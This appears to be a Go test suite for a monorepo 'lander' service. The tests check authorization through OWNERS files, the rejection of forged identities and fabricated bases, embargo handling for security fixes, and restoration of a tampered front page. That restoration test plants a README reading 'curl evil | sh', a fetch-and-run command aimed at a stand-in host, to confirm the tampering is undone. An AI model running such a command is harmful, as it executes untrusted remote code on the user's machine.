package lander

import (
	"strings"
	"testing"
)

func TestLandAdvancesTrunkAtomicallyAndPreservesAuthorship(t *testing.T) {
	e := newEnv(t)
	oldHist := e.trunkRef("refs/suda/history")
	e.devWork("t1", map[string]string{"Q/q.go": "package q\n// edit\n"}, "Q: edit", "GIT_AUTHOR_NAME=Wendy", "GIT_AUTHOR_EMAIL=wendy@example.invalid")
	e.cycle()

	if got := e.trunkFile("refs/suda/main", "Q/q.go"); !strings.Contains(got, "// edit") {
		t.Fatalf("trunk Q/q.go = %q", got)
	}
	main, hist := e.trunkRef("refs/suda/main"), e.trunkRef("refs/suda/history")
	if git(t, e.trunk, "rev-list", "--count", main) != "1" {
		t.Fatal("refs/suda/main must stay a parentless snapshot")
	}
	if git(t, e.trunk, "rev-parse", hist+"^") != oldHist {
		t.Fatal("history commit must chain onto the previous tip")
	}
	if git(t, e.trunk, "rev-parse", main+"^{tree}") != git(t, e.trunk, "rev-parse", hist+"^{tree}") {
		t.Fatal("snapshot and history trees differ")
	}
	if got := git(t, e.trunk, "log", "-1", "--format=%an <%ae>", main); got != "Wendy <wendy@example.invalid>" {
		t.Fatalf("author = %q", got)
	}
	msg := git(t, e.trunk, "log", "-1", "--format=%B", hist)
	if !strings.Contains(msg, "Suda-Requester: maintainer") || !strings.Contains(msg, "Suda-Landed-From: refs/heads/land/t1") {
		t.Fatalf("message lacks provenance trailers:\n%s", msg)
	}
	if refs := e.userRefs("refs/heads/land/"); len(refs) != 0 {
		t.Fatalf("land ref not deleted: %v", refs)
	}
	if !e.hasStatus("suda/land success") {
		t.Fatalf("no success status: %v", e.forge.statuses)
	}
	if git(t, e.user, "rev-parse", "refs/suda/main") != main {
		t.Fatal("trunk copy in the user repository is stale")
	}
}

func TestForgedIdentityNeverAuthorizes(t *testing.T) {
	e := newEnv(t)
	e.forge.def = "mallory"
	// Commit metadata claims alice and carries a Reviewed-by trailer; neither counts.
	e.devWork("forge", map[string]string{"P/a.go": "package p\n// evil\n"}, "P: change\n\nReviewed-by: @alice",
		"GIT_AUTHOR_NAME=alice", "GIT_AUTHOR_EMAIL=alice@gosuda.org")
	before := e.trunkRef("refs/suda/main")
	e.cycle()
	if e.trunkRef("refs/suda/main") != before {
		t.Fatal("forged landing advanced the trunk")
	}
	if !e.hasStatus("suda/land failure OWNERS") {
		t.Fatalf("expected OWNERS failure status: %v", e.forge.statuses)
	}
	if refs := e.userRefs("refs/heads/land/"); len(refs) != 0 {
		t.Fatalf("rejected land ref must be closed: %v", refs)
	}

	// The same change lands when an authenticated owner approves the exact tip.
	tip := e.devWork("forge2", map[string]string{"P/a.go": "package p\n// ok\n"}, "P: change")
	e.forge.approvals["gosuda/1|review/forge2"] = []string{"alice"}
	git(t, e.dev, "push", "-q", e.user, tip+":refs/heads/review/forge2")
	e.cycle()
	if !strings.Contains(e.trunkFile("refs/suda/main", "P/a.go"), "// ok") {
		t.Fatal("approved landing did not land")
	}
	if refs := e.userRefs("refs/heads/review/"); len(refs) != 0 {
		t.Fatalf("review branch not cleaned: %v", refs)
	}
}

func TestSandboxOfAnotherActorIsProtected(t *testing.T) {
	e := newEnv(t)
	e.forge.def = "mallory"
	e.devWork("x", map[string]string{"experimental/bob/exp.go": "package exp // evil\n"}, "exp: evil")
	before := e.trunkRef("refs/suda/main")
	e.cycle()
	if e.trunkRef("refs/suda/main") != before {
		t.Fatal("mallory modified bob's sandbox")
	}
	e.forge.def = "bob"
	e.devWork("y", map[string]string{"experimental/bob/exp.go": "package exp // mine\n"}, "exp: mine")
	e.cycle()
	if !strings.Contains(e.trunkFile("refs/suda/main", "experimental/bob/exp.go"), "mine") {
		t.Fatal("bob could not edit his own sandbox")
	}
}

func TestRejectionsDoNotBlockTheQueue(t *testing.T) {
	e := newEnv(t)
	// Conflicting pair (same line), a bad one in the middle, then a valid one.
	e.devWork("a-first", map[string]string{"Q/q.go": "package q\n// one\n"}, "Q: one")
	// Second workspace is built on the same base (still the initial snapshot) and conflicts.
	e.devWork("b-conflict", map[string]string{"Q/q.go": "package q\n// two\n"}, "Q: two")
	e.devWork("c-ok", map[string]string{"R/r.go": "package r\n// fine\n"}, "R: fine")
	e.cycle()
	if !strings.Contains(e.trunkFile("refs/suda/main", "R/r.go"), "fine") {
		t.Fatal("valid request behind a conflicting one did not land")
	}
	if got := e.trunkFile("refs/suda/main", "Q/q.go"); strings.Contains(got, "two") {
		t.Fatalf("conflicting change landed: %q", got)
	}
	if !e.hasStatus("failure merge conflict") {
		t.Fatalf("conflict not reported: %v", e.forge.statuses)
	}
	if refs := e.userRefs("refs/heads/land/"); len(refs) != 0 {
		t.Fatalf("refs left behind: %v", refs)
	}
}

func TestFiveConcurrentRequestsAllLand(t *testing.T) {
	e := newEnv(t)
	for i, f := range []string{"Q/1.go", "Q/2.go", "Q/3.go", "R/4.go", "R/5.go"} {
		e.devWork("c"+itoa(i), map[string]string{f: "package x\n"}, "add "+f)
	}
	e.cycle()
	for _, f := range []string{"Q/1.go", "Q/2.go", "Q/3.go", "R/4.go", "R/5.go"} {
		if !e.trunkHas(f) {
			t.Errorf("%s missing from trunk", f)
		}
	}
	if n := git(t, e.trunk, "rev-list", "--count", "refs/suda/history"); n != "6" {
		t.Fatalf("history length = %s, want 6", n)
	}
}

func TestUnknownBaseIsRejected(t *testing.T) {
	e := newEnv(t)
	git(t, e.dev, "checkout", "-q", "--orphan", "fake")
	git(t, e.dev, "rm", "-rfq", "--cached", ".")
	git(t, e.dev, "clean", "-fdxq")
	write(t, e.dev, map[string]string{"Q/q.go": "package q\n", "OWNERS": "@mallory\n"})
	git(t, e.dev, "add", "-A")
	git(t, e.dev, "commit", "-qm", "fabricated root")
	git(t, e.dev, "push", "-q", e.user, "HEAD:refs/heads/land/fake")
	before := e.trunkRef("refs/suda/main")
	e.cycle()
	if e.trunkRef("refs/suda/main") != before || !e.hasStatus("unknown base") {
		t.Fatalf("fabricated base accepted or not reported: %v", e.forge.statuses)
	}
}

func TestUnresolvedPusherDefersWithoutRejecting(t *testing.T) {
	e := newEnv(t)
	e.forge.def = "-"
	e.devWork("late", map[string]string{"Q/q.go": "package q\n// late\n"}, "Q: late")
	e.cycle()
	if len(e.userRefs("refs/heads/land/")) != 1 || len(e.forge.statuses) != 0 {
		t.Fatal("request must stay queued while the activity entry is not visible")
	}
	e.forge.def = "maintainer"
	e.cycle()
	if !strings.Contains(e.trunkFile("refs/suda/main", "Q/q.go"), "late") {
		t.Fatal("deferred request did not land once visible")
	}
}

func TestLandIsIdempotentAfterCrashBeforeCleanup(t *testing.T) {
	e := newEnv(t)
	tip := e.devWork("crash", map[string]string{"Q/q.go": "package q\n// c\n"}, "Q: c")
	e.cycle()
	hist := e.trunkRef("refs/suda/history")
	// Simulate: the trunk push happened but the land ref deletion was lost.
	git(t, e.dev, "push", "-q", e.user, tip+":refs/heads/land/crash")
	e.cycle()
	if e.trunkRef("refs/suda/history") != hist {
		t.Fatal("re-processing a landed request must not create another commit")
	}
	if len(e.userRefs("refs/heads/land/")) != 0 {
		t.Fatal("land ref not cleaned after AlreadyLanded")
	}
}

func TestControlPlaneEditsAdvanceMainBranchAndKeepOverlayInvariant(t *testing.T) {
	e := newEnv(t)
	oldCtrl := e.trunkRef("refs/heads/main")
	e.devWork("cp", map[string]string{"README.md": "control plane v2\n", "Q/q.go": "package q\n// both\n"}, "docs + Q")
	e.cycle()
	newCtrl := e.trunkRef("refs/heads/main")
	if newCtrl == oldCtrl || git(t, e.trunk, "rev-parse", newCtrl+"^") != oldCtrl {
		t.Fatal("refs/heads/main must advance as a regular child commit")
	}
	if e.trunkFile("refs/heads/main", "README.md") != "control plane v2" {
		t.Fatal("control plane README not updated")
	}
	if exec2(e, "refs/heads/main", "Q") {
		t.Fatal("source directories must never appear on refs/heads/main")
	}
}

func exec2(e *env, ref, path string) bool { return gitOK(e.trunk, "cat-file", "-e", ref+":"+path) }

func TestBreakGlassControlPlanePushIsOverlaySyncedIntoTrunk(t *testing.T) {
	e := newEnv(t)
	git(t, e.dev, "checkout", "-q", "-B", "cp", e.trunkRef("refs/heads/main"))
	write(t, e.dev, map[string]string{"README.md": "emergency edit\n"})
	git(t, e.dev, "commit", "-qam", "emergency")
	git(t, e.dev, "push", "-q", e.trunk, "HEAD:refs/heads/main")
	e.cycle()
	if got := e.trunkFile("refs/suda/main", "README.md"); got != "emergency edit" {
		t.Fatalf("trunk README = %q", got)
	}
	if msg := git(t, e.trunk, "log", "-1", "--format=%B", "refs/suda/history"); !strings.Contains(msg, "Suda-Break-Glass:") {
		t.Fatalf("overlay sync must be marked:\n%s", msg)
	}
}

func TestPublishLanderBranchExportsDeployableTree(t *testing.T) {
	e := newEnv(t)
	e.cycle()
	got := git(t, e.trunk, "ls-tree", "-r", "--name-only", "refs/heads/lander")
	for _, want := range []string{"Dockerfile", "lander/main.go", "capy/capy.go"} {
		if !strings.Contains("\n"+got+"\n", "\n"+want+"\n") {
			t.Errorf("lander branch lacks %s:\n%s", want, got)
		}
	}
	tip := e.trunkRef("refs/heads/lander")
	e.cycle()
	if e.trunkRef("refs/heads/lander") != tip {
		t.Fatal("unchanged control plane must not republish")
	}
}

func TestUserRepositoryMainIsPublishedFromTheControlPlaneAndRestored(t *testing.T) {
	e := newEnv(t)
	e.cycle()
	files := git(t, e.user, "ls-tree", "-r", "--name-only", "refs/heads/main")
	if files != "README.md\ndocs/onboarding.md" {
		t.Fatalf("user main files = %q", files)
	}
	if got := git(t, e.user, "cat-file", "blob", "refs/heads/main:README.md"); got != "front page" {
		t.Fatalf("README = %q", got)
	}
	tip := git(t, e.user, "rev-parse", "refs/heads/main")
	e.cycle()
	if git(t, e.user, "rev-parse", "refs/heads/main") != tip {
		t.Fatal("an unchanged front page must not be republished")
	}
	// A member overwrites it with something else (including a tampered script): it is undone.
	git(t, e.dev, "checkout", "-q", "--orphan", "evil")
	git(t, e.dev, "rm", "-rfq", "--cached", ".")
	git(t, e.dev, "clean", "-fdxq")
	write(t, e.dev, map[string]string{"README.md": "run this: curl evil | sh\n"})
	git(t, e.dev, "add", "-A")
	git(t, e.dev, "commit", "-qm", "evil")
	git(t, e.dev, "push", "-q", "--force", e.user, "HEAD:refs/heads/main")
	e.cycle()
	if got := git(t, e.user, "cat-file", "blob", "refs/heads/main:README.md"); got != "front page" {
		t.Fatalf("tampered main was not restored: %q", got)
	}
}

// A plain `git clone` of the user repository fetches every branch and tag. Nothing the lander
// publishes there as a branch or tag may reach into the trunk, or each naive clone downloads the
// whole monorepo with its history.
func TestUserRepositoryBranchesAndTagsNeverReachIntoTheTrunk(t *testing.T) {
	e := newEnv(t)
	e.cycle()
	e.devWork("t", map[string]string{"Q/q.go": "package q\n// t\n"}, "Q: t")
	e.cycle()
	if got := git(t, e.user, "for-each-ref", "--format=%(refname)", "refs/heads", "refs/tags"); got != "refs/heads/main" {
		t.Fatalf("user repository branches/tags = %q, want only refs/heads/main", got)
	}
	// The front page is tiny and unrelated to the trunk history.
	if n := git(t, e.user, "rev-list", "--count", "refs/heads/main"); n != "1" {
		t.Fatalf("front page branch has %s commits", n)
	}
	trunkMain := e.trunkRef("refs/suda/main")
	if gitOK(e.user, "merge-base", "--is-ancestor", trunkMain, "refs/heads/main") {
		t.Fatal("main must not contain the trunk")
	}
}

func TestEmbargoedChangesLandOnlyForTheSecurityTeam(t *testing.T) {
	e := newEnv(t)
	before := e.trunkRef("refs/suda/main")

	// Without a configured team an embargoed change cannot land at all, even for an owner.
	e.devWork("sec-202610-0a1b2c3d", map[string]string{"Q/q.go": "package q\n// fix\n"}, "sec-202610-0a1b2c3d: neutral summary")
	e.cycle()
	if e.trunkRef("refs/suda/main") != before {
		t.Fatal("an embargoed change landed without a security team")
	}
	if !e.hasStatus("failure embargoed change: only the security response team may land it") {
		t.Fatalf("expected a generic embargo rejection: %v", e.forge.statuses)
	}
	for _, s := range e.forge.statuses {
		if strings.Contains(s, "Q/q.go") || strings.Contains(s, "fix") {
			t.Fatalf("status leaks details of the embargoed change: %s", s)
		}
	}

	// With the team configured, a non-member is still rejected and a member lands it.
	e.l.EmbargoTeam = "gosuda/security-response"
	e.forge.teams["gosuda/security-response"] = map[string]bool{"carol": true}
	e.devWork("sec-202610-0a1b2c3d", map[string]string{"Q/q.go": "package q\n// fix\n"}, "sec-202610-0a1b2c3d: neutral summary")
	e.cycle()
	if e.trunkRef("refs/suda/main") != before {
		t.Fatal("a non-member of the security team landed an embargoed change")
	}
	// A security-team member who is not an owner of the path still goes through OWNERS.
	e.forge.def = "carol"
	e.devWork("sec-202610-0a1b2c3d", map[string]string{"Q/q.go": "package q\n// fix\n"}, "sec-202610-0a1b2c3d: neutral summary")
	e.cycle()
	if e.trunkRef("refs/suda/main") != before || !e.hasStatus("failure OWNERS") {
		t.Fatalf("the security team must not bypass OWNERS: %v", e.forge.statuses)
	}

	// An owner who is a member of the security team releases it.
	e.forge.def = "maintainer"
	e.forge.teams["gosuda/security-response"]["maintainer"] = true
	e.devWork("sec-202610-0a1b2c3d", map[string]string{"Q/q.go": "package q\n// fix\n"}, "sec-202610-0a1b2c3d: neutral summary")
	e.cycle()
	if !strings.Contains(e.trunkFile("refs/suda/main", "Q/q.go"), "// fix") {
		t.Fatalf("an owner in the security team could not release the change: %v", e.forge.statuses)
	}
}

func TestEmbargoMarkerInTheSubjectAlsoGuardsOrdinaryIds(t *testing.T) {
	e := newEnv(t)
	before := e.trunkRef("refs/suda/main")
	e.devWork("fix-q", map[string]string{"Q/q.go": "package q\n// fix\n"}, "sec-202610-deadbeef: neutral summary")
	e.cycle()
	if e.trunkRef("refs/suda/main") != before {
		t.Fatal("a commit marked as embargoed landed under an ordinary id")
	}
	// Ordinary changes are unaffected.
	e.devWork("plain", map[string]string{"Q/q.go": "package q\n// ordinary\n"}, "Q: ordinary change")
	e.cycle()
	if !strings.Contains(e.trunkFile("refs/suda/main", "Q/q.go"), "ordinary") {
		t.Fatal("an ordinary change was blocked by the embargo guard")
	}
}

func TestEmbargoNamesAreRecognizedByAnySegment(t *testing.T) {
	for name, want := range map[string]bool{
		"sec-202610-0a1b2c3d":       true,
		"alice/sec/sec-202610-aaaa": true,
		"alice/sec/anything":        true,
		"alice/sec-202610-aaaa":     true,
		"base/sec-x":                true,
		"alice/security-docs":       false,
		"alice/second-try":          false,
		"alice/fix-header":          false,
		"capy/HQQ-pr-12":            false,
		"alice/exp-secrets":         false,
	} {
		if got := isEmbargoName(name); got != want {
			t.Errorf("isEmbargoName(%q) = %v, want %v", name, got, want)
		}
	}
}

func TestCommitsCarryTheConfiguredBotIdentityAndKeepMemberAuthors(t *testing.T) {
	e := newEnv(t)
	bot := Identity{Name: "suda-lander[bot]", Email: "350558086+suda-lander[bot]@users.noreply.github.com"}
	e.l.Store.Identity = bot
	e.devWork("who", map[string]string{"Q/q.go": "package q\n// who\n"}, "Q: who", "GIT_AUTHOR_NAME=Wendy", "GIT_AUTHOR_EMAIL=wendy@example.invalid")
	e.cycle()

	landed := "refs/suda/history"
	if got := git(t, e.trunk, "log", "-1", "--format=%an <%ae> | %cn <%ce>", landed); got != "Wendy <wendy@example.invalid> | suda-lander[bot] <350558086+suda-lander[bot]@users.noreply.github.com>" {
		t.Fatalf("landed commit identities = %q (author must stay the member, committer is the bot)", got)
	}
	// Commits the lander writes itself carry the bot as author and committer.
	for _, ref := range []string{"refs/suda/sync/p", "refs/heads/lander"} {
		if got := git(t, e.trunk, "log", "-1", "--format=%an <%ae> | %cn <%ce>", ref); !strings.Contains(got, bot.Email) || strings.Contains(got, "lander@gosuda.org") {
			t.Fatalf("%s identities = %q", ref, got)
		}
	}
	if got := git(t, e.user, "log", "-1", "--format=%an <%ae>", "refs/heads/main"); !strings.Contains(got, bot.Email) {
		t.Fatalf("front page author = %q", got)
	}
}
